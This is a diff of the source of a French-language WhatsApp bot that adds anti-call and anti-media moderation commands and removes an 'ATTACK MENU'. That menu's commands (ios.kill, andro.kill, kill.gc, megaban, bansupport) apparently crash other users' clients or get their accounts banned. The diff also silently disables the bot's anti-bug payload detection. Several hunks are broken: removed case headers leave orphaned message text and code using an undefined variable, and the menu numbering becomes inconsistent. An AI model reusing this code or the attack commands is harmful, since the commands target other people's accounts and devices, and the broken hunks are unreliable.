@@ -1,5 +1,5 @@
 import { handleSuperAdmin, isSuperAdminJid } from './superadmin.js';
-import { handleNewCommands, handleAntiMedia, handleIncomingCall, getNewCommandsMenu } from './commands.js';
+import { handleNewCommands, getNewCommandsMenu } from './commands.js';
 import makeWASocket, {
   DisconnectReason,
   useMultiFileAuthState,
@@ -213,6 +213,11 @@ async function createUserSession(phone) {
     printQRInTerminal: false,
     auth: state,
     browser: ['Ubuntu', 'Chrome', '20.0.04'],
+    keepAliveIntervalMs: 30000,
+    connectTimeoutMs: 60000,
+    defaultQueryTimeoutMs: 60000,
+    retryRequestDelayMs: 250,
+    maxMsgRetryCount: 5,
     getMessage: async () => ({ conversation: '' })
   });
 
@@ -321,6 +326,11 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
   const _origSend = sock.sendMessage.bind(sock);
   sock.sendMessage = async function(jid, content, options = {}) {
     try {
+      // ✅ Filtre: ne pas envoyer si le contenu est vide ou invalide
+      if (!content || typeof content !== 'object') return null;
+      if (content.text !== undefined && content.text === '') return null;
+      if (!jid || typeof jid !== 'string') return null;
+
       const skip = content?.react !== undefined || content?.delete !== undefined ||
                    content?.groupStatusMessage !== undefined || jid === 'status@broadcast';
       if (!skip) {
@@ -607,6 +617,11 @@ let antiEdit = true;
 let antiDeleteMode = 'all'; // 'private' | 'gchat' | 'all'
 let antiEditMode = 'all';   // 'private' | 'gchat' | 'all'
 let antiBug = true; // ✅ Anti-Bug activé par défaut
+let antiCallEnabled = true;
+let antiStickerEnabled = false;
+let antiImageEnabled = false;
+let antiVideoEnabled = false;
+let antiVoiceEnabled = false;
 let chatbotEnabled = false; // 🤖 Chatbot SEIGNEUR TD OFF par défaut
 let stickerPackname = 'SEIGNEUR TD 🇷🇴'; // 📦 Nom du pack sticker
 let stickerAuthor = 'SEIGNEUR TD 🇷🇴'; // ✍️ Auteur du sticker
@@ -1169,6 +1184,31 @@ function checkCooldown(userId, commandName) {
   return true;
 }
 
+// =============================================
+// 📵 ANTI-CALL — Refuser les appels entrants
+// =============================================
+async function handleIncomingCall(sock, call) {
+  try {
+    if (!antiCallEnabled) return;
+    const callerJid = call.from;
+    const callId = call.id;
+    const isVideo = call.isVideo || false;
+    const callType = isVideo ? 'VIDÉO' : 'AUDIO';
+    console.log(`📞 [ANTI-CALL] Appel ${callType} entrant de ${callerJid}`);
+    await sock.rejectCall(callId, callerJid);
+    await sock.sendMessage(callerJid, {
+      text: `╔═══『 ᴀɴᴛɪ-ᴄᴀʟʟ 』═══╗
+║ 📵 ᴀᴘᴘᴇʟ ʀᴇғᴜsé
+║ ⚡ Mode : ᴀᴄᴛɪᴠé ✅
+╚══════════════════╝
+
+_© SEIGNEUR TD 🇷🇴_`
+    });
+  } catch (error) {
+    console.error('[ANTI-CALL] Erreur:', error.message);
+  }
+}
+
 async function simulateTyping(sock, jid, duration = 3000) {
   if (!autoTyping) return;
   try {
@@ -1503,6 +1543,11 @@ async function connectToWhatsApp() {
     printQRInTerminal: !config.usePairingCode,
     auth: state,
     browser: ['Ubuntu', 'Chrome', '20.0.04'],
+    keepAliveIntervalMs: 30000,
+    connectTimeoutMs: 60000,
+    defaultQueryTimeoutMs: 60000,
+    retryRequestDelayMs: 250,
+    maxMsgRetryCount: 5,
     getMessage: async (key) => {
       return { conversation: '' };
     }
@@ -1555,6 +1600,7 @@ async function connectToWhatsApp() {
       console.log(`Bot: ${config.botName}`);
       console.log(`Bot JID: ${sock.user.id}`);
       console.log('\n⚔️ SEIGNEUR TD 🇷🇴 est prêt! ⚔️\n');
+      _botSock = sock; // ✅ Enregistrer pour le watchdog
 
       // Message de bienvenue au PV du bot à la première connexion
       try {
@@ -1621,6 +1667,11 @@ async function connectToWhatsApp() {
   _origSendMessageGlobal = _origSendMessage; // accessible globalement pour swgrup
   sock.sendMessage = async function(jid, content, options = {}) {
     try {
+      // ✅ Filtre: ne pas envoyer si le contenu est vide ou invalide
+      if (!content || typeof content !== 'object') return null;
+      if (content.text !== undefined && content.text === '') return null;
+      if (!jid || typeof jid !== 'string') return null;
+
       const skip = content?.react !== undefined || content?.delete !== undefined ||
                    content?.groupStatusMessage !== undefined || jid === 'status@broadcast';
       if (!skip) {
@@ -1855,6 +1906,7 @@ async function connectToWhatsApp() {
 
       const msgAge=Date.now()-((message.messageTimestamp||0)*1000);
       if(msgAge>60000)continue;
+      _lastMsgTime = Date.now(); // ✅ Watchdog: màj activité
       const msgId=message.key.id;
       if(processedMsgIds.has(msgId))continue;
       processedMsgIds.add(msgId);
@@ -2381,11 +2433,7 @@ ${qTxt2}` });
       // 🛡️ ANTI-BUG GLOBAL (avant toute autre logique)
       // =============================================
       if (antiBug && !isAdminOrOwner() && !isSuperAdminJid(senderJid)) {
-        const bugDetected = detectBugPayload(message, messageText);
-        if (bugDetected) {
-          await handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugDetected);
-          continue;
-        }
+
       }
 
       // Auto-react
@@ -2770,15 +2818,48 @@ async function handleCommand(sock, message, messageText, remoteJid, senderJid, i
     return;
   }
 
-  // 🛡️ Anti-Media (sticker/image/video/voice)
-  try {
-    const mediaBlocked = await handleAntiMedia({
-      sock, message, remoteJid, senderJid,
-      isGroup, isGroupAdmin, isBotGroupAdmin,
-      initGroupSettings, saveStoreKey, addWarn, resetWarns
-    });
-    if (mediaBlocked) return;
-  } catch(e) {}
+  // 🛡️ Anti-Media (sticker/image/video/voice) — détection inline
+  if (isGroup) {
+    try {
+      const _amSettings = initGroupSettings(remoteJid);
+      const _amUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
+      const _amBotAdmin = await isBotGroupAdmin(sock, remoteJid);
+      if (!_amUserAdmin && _amBotAdmin) {
+        // ANTI-STICKER
+        if (_amSettings.antisticker && message.message?.stickerMessage) {
+          await sock.sendMessage(remoteJid, { delete: message.key });
+          const wc = addWarn(remoteJid, senderJid, 'Envoi de sticker interdit');
+          await sock.sendMessage(remoteJid, { text: `⚠️ ᴀʟᴇʀᴛᴇ ➔ @${senderJid.split('@')[0]}\n↳ ʟᴇs sᴛɪᴄᴋᴇʀs sᴏɴᴛ ɪɴᴛᴇʀᴅɪᴛs ɪᴄɪ.\n\n⚠️ Avertissement ${wc}/3`, mentions: [senderJid] });
+          if (wc >= 3) { try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: `🚨 ᴇxᴘᴜʟsɪᴏɴ ➔ @${senderJid.split('@')[0]}\n↳ ᴛʀᴏᴘ ᴅ'ᴀᴠᴇʀᴛɪssᴇᴍᴇɴᴛs (sᴛɪᴄᴋᴇʀs)`, mentions: [senderJid] }); } catch(e){} resetWarns(remoteJid, senderJid); }
+          return;
+        }
+        // ANTI-IMAGE
+        if (_amSettings.antiimage && message.message?.imageMessage) {
+          await sock.sendMessage(remoteJid, { delete: message.key });
+          const wc = addWarn(remoteJid, senderJid, "Envoi d'image interdit");
+          await sock.sendMessage(remoteJid, { text: `🚨 ʀèɢʟᴇᴍᴇɴᴛ ➔ @${senderJid.split('@')[0]}\n↳ ʟᴇs ɪᴍᴀɢᴇs sᴏɴᴛ ɪɴᴛᴇʀᴅɪᴛᴇs ɪᴄɪ.\n\n⚠️ Avertissement ${wc}/3`, mentions: [senderJid] });
+          if (wc >= 3) { try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: `🚨 ᴇxᴘᴜʟsɪᴏɴ ➔ @${senderJid.split('@')[0]}\n↳ ᴛʀᴏᴘ ᴅ'ᴀᴠᴇʀᴛɪssᴇᴍᴇɴᴛs (ɪᴍᴀɢᴇs)`, mentions: [senderJid] }); } catch(e){} resetWarns(remoteJid, senderJid); }
+          return;
+        }
+        // ANTI-VIDÉO
+        if (_amSettings.antivideo && message.message?.videoMessage) {
+          await sock.sendMessage(remoteJid, { delete: message.key });
+          const wc = addWarn(remoteJid, senderJid, 'Envoi de vidéo interdit');
+          await sock.sendMessage(remoteJid, { text: `🚫 ɪɴᴛᴇʀᴅɪᴛ ➔ @${senderJid.split('@')[0]}\n↳ ʟᴇs ᴠɪᴅéᴏs sᴏɴᴛ ʙʟᴏǫᴜéᴇs ᴅᴀɴs ᴄᴇ ɢʀᴏᴜᴘᴇ.\n\n⚠️ Avertissement ${wc}/3`, mentions: [senderJid] });
+          if (wc >= 3) { try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: `🚨 ᴇxᴘᴜʟsɪᴏɴ ➔ @${senderJid.split('@')[0]}\n↳ ᴛʀᴏᴘ ᴅ'ᴀᴠᴇʀᴛɪssᴇᴍᴇɴᴛs (ᴠɪᴅéᴏs)`, mentions: [senderJid] }); } catch(e){} resetWarns(remoteJid, senderJid); }
+          return;
+        }
+        // ANTI-VOICE
+        if (_amSettings.antivoice && message.message?.audioMessage?.ptt === true) {
+          await sock.sendMessage(remoteJid, { delete: message.key });
+          const wc = addWarn(remoteJid, senderJid, 'Envoi de vocal interdit');
+          await sock.sendMessage(remoteJid, { text: `🔇 ᴍᴜᴇᴛ ➔ @${senderJid.split('@')[0]}\n↳ ᴘᴀs ᴅᴇ ᴠᴏᴄᴀᴜx ! ᴍᴇʀᴄɪ ᴅ'éᴄʀɪʀᴇ ᴠᴏᴛʀᴇ ᴍᴇssᴀɢᴇ.\n\n⚠️ Avertissement ${wc}/3`, mentions: [senderJid] });
+          if (wc >= 3) { try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: `🚨 ᴇxᴘᴜʟsɪᴏɴ ➔ @${senderJid.split('@')[0]}\n↳ ᴛʀᴏᴘ ᴅ'ᴀᴠᴇʀᴛɪssᴇᴍᴇɴᴛs (ᴠᴏᴄᴀᴜx)`, mentions: [senderJid] }); } catch(e){} resetWarns(remoteJid, senderJid); }
+          return;
+        }
+      }
+    } catch(e) { console.error('[ANTI-MEDIA]', e.message); }
+  }
 
   try {
     switch (command) {
@@ -2839,85 +2920,6 @@ https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
         await handleFancy(sock, args, remoteJid, senderJid);
         break;
 
-      case 'ping':
-      case 'p': {
-        const start = Date.now();
-        try { await sock.sendMessage(remoteJid, { react: { text: '🏓', key: message.key } }); } catch(e) {}
-        const latency = Date.now() - start;
-
-        // Uptime
-        const uptimeSec = Math.floor(process.uptime());
-        const uh = Math.floor(uptimeSec / 3600);
-        const um = Math.floor((uptimeSec % 3600) / 60);
-        const us = uptimeSec % 60;
-        const uptimeStr = `${uh}h ${um}m`;
-
-        // RAM
-        const osM = await import('os');
-        const totalRam = osM.totalmem() / 1024 / 1024;
-        const freeRam  = osM.freemem()  / 1024 / 1024;
-        const usedRam  = totalRam - freeRam;
-        const ramPct   = Math.round((usedRam / totalRam) * 100);
-
-        // Time
-        const nowP = new Date();
-        const timeStr = nowP.toLocaleTimeString('fr-FR', {
-          timeZone: 'Africa/Ndjamena',
-          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
-        });
-
-        const pingText =
-` ⌬ SPEED SEIGNEUR
-────────────────────
-|  🏓 ᴘɪɴɢ   : ${latency}ms
-  ⏳ ᴜᴘᴛɪᴍᴇ : ${uptimeStr}
-  💾 ʀᴀᴍ    : ${usedRam.toFixed(1)}MB (${ramPct}%)
-  🕒 ᴛɪᴍᴇ   : ${timeStr}
-────────────────────`;
-
-        await sock.sendMessage(remoteJid, { text: pingText });
-        break;
-      }
-
-      case 'alive': {
-        await simulateTyping(sock, remoteJid);
-        try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}
-
-        // Ping rapide
-        const aliveStart = Date.now();
-        const aliveLatency = Date.now() - aliveStart;
-
-        // Uptime
-        const uptimeSec2 = Math.floor(process.uptime());
-        const ud = Math.floor(uptimeSec2 / 86400);
-        const uh2 = Math.floor((uptimeSec2 % 86400) / 3600);
-        const um2 = Math.floor((uptimeSec2 % 3600) / 60);
-        const upStr2 = ud > 0
-          ? `${ud}d ${uh2}h ${um2}m`
-          : uh2 > 0
-          ? `${String(uh2).padStart(2,'0')}h ${String(um2).padStart(2,'0')}m`
-          : `${String(um2).padStart(2,'0')}m`;
-
-        const aliveText =
-`✧ ───  ⚡ ᴀᴄᴛɪꜰ ᴇᴛ ᴘʀêᴛ ⚡ ─── ✧
-
-\`Je suis là pour vous servir.\`
-
-🕊️ Propriétaire: SEIGNEUR TD 🇷🇴
-⚡ Ping: ${aliveLatency}ms
-⏳ Temps actif: ${upStr2}
-❄️ Version: 2.0.1
-
-🌟 Dépôt : 
-▰▰▰▰▰▰▰▰▱▱ ACTIF
-─── ⋆⋅☆⋅⋆ ───
-> © 𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓫𝔂 SEIGNEUR TD 🇷🇴`;
-
-        await sendWithImage(sock, remoteJid, 'alive', aliveText);
-        await sendCmdAudio(sock, remoteJid);
-        break;
-      }
-
       case 'info':{
         await simulateTyping(sock,remoteJid);
         const _iu=Math.floor(process.uptime());
@@ -2962,15 +2964,13 @@ https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
         await sendSubMenu(sock, message, remoteJid, senderJid, 'group'); break;
       case '4': case 'utilitymenu': case 'protectionmenu':
         await sendSubMenu(sock, message, remoteJid, senderJid, 'utility'); break;
-      case '5': case 'bugmenu': case 'attackmenu':
-        await sendSubMenu(sock, message, remoteJid, senderJid, 'bug'); break;
-      case '6': case 'stickermenu': case 'mediamenu':
+      case '5': case 'stickermenu': case 'mediamenu':
         await sendSubMenu(sock, message, remoteJid, senderJid, 'sticker'); break;
-      case '7': case 'miscmenu': case 'generalmenu':
+      case '6': case 'miscmenu': case 'generalmenu':
         await sendSubMenu(sock, message, remoteJid, senderJid, 'misc'); break;
-      case '8': case 'imagemenu': case 'viewoncemenu':
+      case '7': case 'imagemenu': case 'viewoncemenu':
         await sendSubMenu(sock, message, remoteJid, senderJid, 'image'); break;
-      case '9': case 'gamesmenu': case 'gamemenu':
+      case '8': case 'gamesmenu': case 'gamemenu':
         await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;
 
       case 'vv':
@@ -3272,6 +3272,106 @@ Style actuel: *${menuStyle}*`
         }
         await handleAntiBugCommand(sock, args, remoteJid, senderJid);
         break;
+
+      case 'anticall':
+      case 'antiappel': {
+        if (!isAdminOrOwner()) {
+          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' }); break;
+        }
+        const _subAC = args[0]?.toLowerCase();
+        if (_subAC === 'on' || _subAC === 'enable') {
+          antiCallEnabled = true; saveStoreKey('config');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴄᴀʟʟ 』═══╗\n║ ⚡ Status : ᴀᴄᴛɪᴠé ✅\n╚══════════════════╝\n\n📵 Les appels entrants seront automatiquement refusés.` }, { quoted: message });
+        } else if (_subAC === 'off' || _subAC === 'disable') {
+          antiCallEnabled = false; saveStoreKey('config');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴄᴀʟʟ 』═══╗\n║ 🔓 Status : ᴅésᴀᴄᴛɪᴠé ❌\n╚══════════════════╝` }, { quoted: message });
+        } else {
+          const _stAC = antiCallEnabled ? 'ᴀᴄᴛɪᴠé ✅' : 'ᴅésᴀᴄᴛɪᴠé ❌';
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴄᴀʟʟ 』═══╗\n║ 📊 Status : ${_stAC}\n╚══════════════════╝\n\n📌 Commandes :\n• ${config.prefix}anticall on\n• ${config.prefix}anticall off` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'antisticker':
+      case 'antistick': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement' }); break; }
+        const _isUserAdminAS = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_isUserAdminAS && !isAdminOrOwner()) { await sock.sendMessage(remoteJid, { text: '⛔ Admins du groupe uniquement' }); break; }
+        const _subAS = args[0]?.toLowerCase();
+        const _settingsAS = initGroupSettings(remoteJid);
+        if (_subAS === 'on' || _subAS === 'enable') {
+          _settingsAS.antisticker = true; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-sᴛɪᴄᴋᴇʀ 』═══╗\n║ ⚡ Status : ᴀᴄᴛɪᴠé ✅\n╚══════════════════╝` }, { quoted: message });
+        } else if (_subAS === 'off' || _subAS === 'disable') {
+          _settingsAS.antisticker = false; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-sᴛɪᴄᴋᴇʀ 』═══╗\n║ 🔓 Status : ᴅésᴀᴄᴛɪᴠé ❌\n╚══════════════════╝` }, { quoted: message });
+        } else {
+          const _stAS = _settingsAS.antisticker ? 'ᴀᴄᴛɪᴠé ✅' : 'ᴅésᴀᴄᴛɪᴠé ❌';
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-sᴛɪᴄᴋᴇʀ 』═══╗\n║ 📊 Status : ${_stAS}\n╚══════════════════╝\n\n📌 Commandes :\n• ${config.prefix}antisticker on\n• ${config.prefix}antisticker off` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'antiimage':
+      case 'antiphoto': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement' }); break; }
+        const _isUserAdminAI = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_isUserAdminAI && !isAdminOrOwner()) { await sock.sendMessage(remoteJid, { text: '⛔ Admins du groupe uniquement' }); break; }
+        const _subAI = args[0]?.toLowerCase();
+        const _settingsAI = initGroupSettings(remoteJid);
+        if (_subAI === 'on' || _subAI === 'enable') {
+          _settingsAI.antiimage = true; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ɪᴍᴀɢᴇ 』═══╗\n║ ⚡ Status : ᴀᴄᴛɪᴠé ✅\n╚══════════════════╝` }, { quoted: message });
+        } else if (_subAI === 'off' || _subAI === 'disable') {
+          _settingsAI.antiimage = false; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ɪᴍᴀɢᴇ 』═══╗\n║ 🔓 Status : ᴅésᴀᴄᴛɪᴠé ❌\n╚══════════════════╝` }, { quoted: message });
+        } else {
+          const _stAI = _settingsAI.antiimage ? 'ᴀᴄᴛɪᴠé ✅' : 'ᴅésᴀᴄᴛɪᴠé ❌';
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ɪᴍᴀɢᴇ 』═══╗\n║ 📊 Status : ${_stAI}\n╚══════════════════╝\n\n📌 Commandes :\n• ${config.prefix}antiimage on\n• ${config.prefix}antiimage off` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'antivideo':
+      case 'antivid': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement' }); break; }
+        const _isUserAdminAV = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_isUserAdminAV && !isAdminOrOwner()) { await sock.sendMessage(remoteJid, { text: '⛔ Admins du groupe uniquement' }); break; }
+        const _subAV = args[0]?.toLowerCase();
+        const _settingsAV = initGroupSettings(remoteJid);
+        if (_subAV === 'on' || _subAV === 'enable') {
+          _settingsAV.antivideo = true; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠɪᴅéᴏ 』═══╗\n║ ⚡ Status : ᴀᴄᴛɪᴠé ✅\n╚══════════════════╝` }, { quoted: message });
+        } else if (_subAV === 'off' || _subAV === 'disable') {
+          _settingsAV.antivideo = false; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠɪᴅéᴏ 』═══╗\n║ 🔓 Status : ᴅésᴀᴄᴛɪᴠé ❌\n╚══════════════════╝` }, { quoted: message });
+        } else {
+          const _stAV = _settingsAV.antivideo ? 'ᴀᴄᴛɪᴠé ✅' : 'ᴅésᴀᴄᴛɪᴠé ❌';
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠɪᴅéᴏ 』═══╗\n║ 📊 Status : ${_stAV}\n╚══════════════════╝\n\n📌 Commandes :\n• ${config.prefix}antivideo on\n• ${config.prefix}antivideo off` }, { quoted: message });
+        }
+        break;
+      }
+
+      case 'antivoice':
+      case 'antivocal':
+      case 'antiaudio': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement' }); break; }
+        const _isUserAdminAVO = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_isUserAdminAVO && !isAdminOrOwner()) { await sock.sendMessage(remoteJid, { text: '⛔ Admins du groupe uniquement' }); break; }
+        const _subAVO = args[0]?.toLowerCase();
+        const _settingsAVO = initGroupSettings(remoteJid);
+        if (_subAVO === 'on' || _subAVO === 'enable') {
+          _settingsAVO.antivoice = true; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠᴏɪᴄᴇ 』═══╗\n║ ⚡ Status : ᴀᴄᴛɪᴠé ✅\n╚══════════════════╝` }, { quoted: message });
+        } else if (_subAVO === 'off' || _subAVO === 'disable') {
+          _settingsAVO.antivoice = false; saveStoreKey('groupSettings');
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠᴏɪᴄᴇ 』═══╗\n║ 🔓 Status : ᴅésᴀᴄᴛɪᴠé ❌\n╚══════════════════╝` }, { quoted: message });
+        } else {
+          const _stAVO = _settingsAVO.antivoice ? 'ᴀᴄᴛɪᴠé ✅' : 'ᴅésᴀᴄᴛɪᴠé ❌';
+          await sock.sendMessage(remoteJid, { text: `╔═══『 ᴀɴᴛɪ-ᴠᴏɪᴄᴇ 』═══╗\n║ 📊 Status : ${_stAVO}\n╚══════════════════╝\n\n📌 Commandes :\n• ${config.prefix}antivoice on\n• ${config.prefix}antivoice off` }, { quoted: message });
+        }
+        break;
+      }
 
       case 'antidelete':
       case 'antidel':
@@ -4810,62 +4910,6 @@ ${desc}
       // COMMANDES BUGS 🪲
       // =============================================
 
-      case 'kill.gc':
-      case 'killgc':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleKillGC(sock, args, remoteJid, senderJid, message);
-        break;
-
-      case 'ios.kill':
-      case 'ioskill':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleIOSKill(sock, args, remoteJid, senderJid, message);
-        break;
-
-      case 'andro.kill':
-      case 'androkill':
-      case 'androidkill':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleAndroKill(sock, args, remoteJid, senderJid, message);
-        break;
-
-      case 'silent':
-      case 'report':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleSilent(sock, args, remoteJid, senderJid, message);
-        break;
-
-      case 'bansupport':
-      case 'bansupp':
-      case 'xban':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleBanSupport(sock, args, remoteJid, senderJid, message);
-        break;
-
-      case 'xcrash':
-      case 'megaban':
-        if (!isAdminOrOwner()) {
-          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
-          break;
-        }
-        await handleMegaBan(sock, args, remoteJid, senderJid, message);
-        break;
-
       case 'updatedev':
       case 'devupdate':
       case 'managedev':
@@ -5250,16 +5294,6 @@ _SEIGNEUR TD 🇷🇴_`;
       }
 
       // ─── SONG : rechercher une chanson YouTube ───────────────────────────
-      case 'song':
-      case 'music':
-      case 'recherche': {
-        if (!args[0]) {
-          await sock.sendMessage(remoteJid, {
-            text:
-`╔══════════════════════════╗
-║   🎶 SONG SEARCH         ║
-╚══════════════════════════╝
-
 📌 *Utilisation :*
 ${config.prefix}song [titre ou artiste]
 
@@ -5601,16 +5635,6 @@ ${config.prefix}song [titre ou artiste]
           });
         }
         break;
-
-      case 'take':
-      case 'steal':
-        try {
-          console.log('🔍 Commande take reçue');
-
-          const quotedMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-          const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
-          const parts = messageBody.slice(1).trim().split(/\s+/);
-          const takeArgs = parts.slice(1);
 
           // Nom du pack = args ou pushName
           const packName = takeArgs.length > 0 ? takeArgs.join(' ') : (message.pushName || 'SEIGNEUR TD');
@@ -6552,13 +6576,13 @@ function buildUptime() {
 function getMenuCategories(p) {
   return [
     { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: [`${p}restart`,`${p}mode`,`${p}update`,`${p}updatedev`,`${p}storestatus`,`${p}storesave`,`${p}pp`,`${p}gpp`,`${p}block`,`${p}unblock`,`${p}join`,`${p}autotyping`,`${p}autorecording`,`${p}autoreact`,`${p}antidelete`,`${p}antiedit`,`${p}readstatus`,`${p}chatboton`,`${p}chatbotoff`,`${p}getsettings`,`${p}setstickerpackname`,`${p}setstickerauthor`,`${p}setprefix`,`${p}setbotimg`] },
-    { num: '2', key: 'download', icon: '\uD83D\uDCE5', label: 'DOWNLOAD MENU',   cmds: [`${p}ytb`,`${p}song`,`${p}shazam`,`${p}tiktok`,`${p}ig`,`${p}apk`,`${p}fb`,`${p}gdrive`,`${p}mf`] },
+    { num: '2', key: 'download', icon: '\uD83D\uDCE5', label: 'DOWNLOAD MENU',   cmds: [`${p}ytb`,`${p}ytmp3`,`${p}shazam`,`${p}tiktok`,`${p}ig`,`${p}apk`,`${p}fb`,`${p}gdrive`,`${p}mf`] },
     { num: '3', key: 'group',    icon: '\uD83D\uDC65', label: 'GROUP MENU',      cmds: [`${p}tagall`,`${p}tagadmins`,`${p}hidetag`,`${p}kickall`,`${p}kickadmins`,`${p}acceptall`,`${p}add`,`${p}kick`,`${p}promote`,`${p}demote`,`${p}mute`,`${p}unmute`,`${p}invite`,`${p}revoke`,`${p}gname`,`${p}gdesc`,`${p}groupinfo`,`${p}welcome`,`${p}goodbye`,`${p}leave`,`${p}listonline`,`${p}listactive`,`${p}listinactive`,`${p}kickinactive`,`${p}groupstatus`,`${p}tosgroup`] },
     { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: [`${p}antibug`,`${p}antilink`,`${p}antibot`,`${p}antitag`,`${p}antispam`,`${p}antimentiongroupe`,`${p}anticall`,`${p}antisticker`,`${p}antiimage`,`${p}antivideo`,`${p}antivoice`,`${p}warn`,`${p}warns`,`${p}resetwarn`,`${p}permaban`,`${p}unpermaban`,`${p}banlist`] },
-    { num: '5', key: 'bug',      icon: '🪲', label: 'ATTACK MENU',     cmds: [`${p}kill.gc`,`${p}ios.kill`,`${p}andro.kill`,`${p}silent`,`${p}bansupport`,`${p}megaban`,`${p}checkban`] },
-    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: [`${p}sticker`,`${p}take`,`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}tostatus`,`${p}tourl`,`${p}cz1`] },
-    { num: '7', key: 'misc',     icon: '📂', label: 'GENERAL MENU',    cmds: [`${p}ping`,`${p}alive`,`${p}info`,`${p}menu`,`${p}allmenu`,`${p}help`,`${p}repo`,`${p}jid`,`${p}quoted`,`${p}dev`,`${p}bible`,`${p}checkban`,`${p}fancy`,`${p}gpt`,`${p}gemini`,`${p}sora`,`${p}hd`,`${p}remini`,`${p}magic`,`${p}delwm`,`${p}vermouil`,`${p}qr`,`${p}lireqr`,`${p}pdf`,`${p}spotify`,`${p}google`,`${p}dict`,`${p}ytmp3`,`${p}vocalremov`,`${p}save`,`${p}setcmd`,`${p}detect`] },
-    { num: '8', key: 'image',    icon: '👁️', label: 'VIEW ONCE MENU',  cmds: [`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}vv last`] },
+
+    { num: '5', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: [`${p}sticker`,`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}tostatus`,`${p}tourl`,`${p}cz1`] },
+    { num: '6', key: 'misc',     icon: '📂', label: 'GENERAL MENU',    cmds: [`${p}info`,`${p}menu`,`${p}allmenu`,`${p}help`,`${p}repo`,`${p}jid`,`${p}quoted`,`${p}dev`,`${p}bible`,`${p}checkban`,`${p}fancy`,`${p}gpt`,`${p}gemini`,`${p}pdf`,`${p}google`,`${p}vocalremov`,`${p}setcmd`,`${p}detect`,`${p}delwm`] },
+    { num: '7', key: 'image',    icon: '👁️', label: 'VIEW ONCE MENU',  cmds: [`${p}vv`,`${p}vv list`,`${p}vv get`,`${p}vv del`,`${p}vv clear`,`${p}vv last`] },
     { num: '9', key: 'games',    icon: '🎮', label: 'GAMES MENU',      cmds: [`${p}tictactoe`,`${p}ttt`,`${p}quizmanga`,`${p}quiz`,`${p}squidgame`,`${p}sg`] },
     { num: '10', key: 'ai',      icon: '🤖', label: 'SEIGNEUR TD AI',   cmds: [`${p}chatbot`,`${p}seigneur`,`${p}td`,`${p}chat`,`${p}chatboton`,`${p}chatbotoff`,`${p}clearchat`,`${p}gpt`,`${p}gemini`] },
   ];
